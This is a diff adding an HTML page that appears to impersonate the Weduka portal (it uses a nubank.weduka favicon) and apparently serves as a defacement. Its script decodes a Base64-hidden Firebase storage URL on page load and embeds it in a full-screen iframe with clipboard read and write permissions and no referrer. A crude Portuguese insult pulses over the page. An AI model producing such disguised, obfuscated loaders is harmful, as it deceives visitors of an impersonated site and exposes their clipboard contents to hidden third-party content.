@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Weduka</title>
+<link rel="icon" type="image/x-icon" href="https://nubank.weduka.com.br/favicon.ico">
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  width: 100%;
+  overflow: hidden;
+  font-family: Arial, sans-serif;
+  background: radial-gradient(circle, rgb(0,0,0), rgb(1,44,42));
+}
+
+/* Container do iframe ocupando 100% da tela */
+#iframeContainer {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 1;
+}
+
+#iframeContainer iframe {
+  width: 100%;
+  height: 100%;
+  border: none;
+  display: block;
+  overflow: hidden;
+}
+
+/* Texto no topo centralizado */
+.top-text {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  font-size: 40px;
+  color: rgb(128, 0, 32);
+  text-align: center;
+  text-shadow: 0 0 10px rgba(128, 0, 32);
+  z-index: 2;
+  user-select: none;
+}
+
+/* Imagens laterais */
+.side-img {
+  height: 1em;
+  width: auto;
+}
+
+/* Letras pulsando */
+.letter {
+  display: inline-block;
+  animation: heartbeat 1.2s infinite ease-in-out;
+}
+
+@keyframes heartbeat {
+  0%, 40%, 80%, 100% { transform: scale(1); opacity: 1; }
+  20% { transform: scale(1.2); opacity: 0.85; }
+  60% { transform: scale(1.15); opacity: 0.9; }
+}
+
+/* Responsivo */
+@media (max-width: 600px) {
+  .top-text {
+    font-size: 24px;
+    top: 10px;
+  }
+}
+</style>
+</head>
+
+<body>
+<div id="iframeContainer"></div>
+
+<div class="top-text">
+  <img class="side-img" src="https://firebasestorage.googleapis.com/v0/b/image-uploader-br.appspot.com/o/images%2Fb4812431-2de6-41ba-b012-2c5a5a808837?alt=media&token=1f164de8-7966-49b2-b333-74283588e6f2" alt="imagem">
+  <span id="pulsing-text">Bokus Cu Frouxo</span>
+  <img class="side-img" src="https://firebasestorage.googleapis.com/v0/b/image-uploader-br.appspot.com/o/images%2Fb4812431-2de6-41ba-b012-2c5a5a808837?alt=media&token=1f164de8-7966-49b2-b333-74283588e6f2" alt="imagem">
+</div>
+
+<script>
+// Decodifica URL Base64 e cria iframe
+const encoded = "aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9pbWFnZS11cGxvYWRlci1ici5hcHBzcG90LmNvbS9vL2ltYWdlcyUyRjdhYzk4ODNkLTE0MDMtNDNkZS04MWU5LTM1ODgyOTdkMmM4Yz9hbHQ9bWVkaWEmdG9rZW49YjY1NDAyOWUtM2RkYy00MjdmLWE3ZjYtM2JjYTdlNTkxM2Ex";
+const url = atob(encoded);
+
+const iframe = document.createElement("iframe");
+iframe.src = url;
+iframe.allow = "autoplay; fullscreen; clipboard-read; clipboard-write";
+iframe.referrerPolicy = "no-referrer";
+iframe.loading = "lazy";
+document.getElementById("iframeContainer").appendChild(iframe);
+
+// Efeito pulsante nas letras
+const textElement = document.getElementById("pulsing-text");
+const text = textElement.textContent;
+textElement.textContent = '';
+for (let i = 0; i < text.length; i++) {
+  const span = document.createElement('span');
+  span.textContent = text[i];
+  span.className = 'letter';
+  span.style.animationDelay = (Math.random() * 0.5) + 's';
+  textElement.appendChild(span);
+}
+</script>
+</body>
+</html>
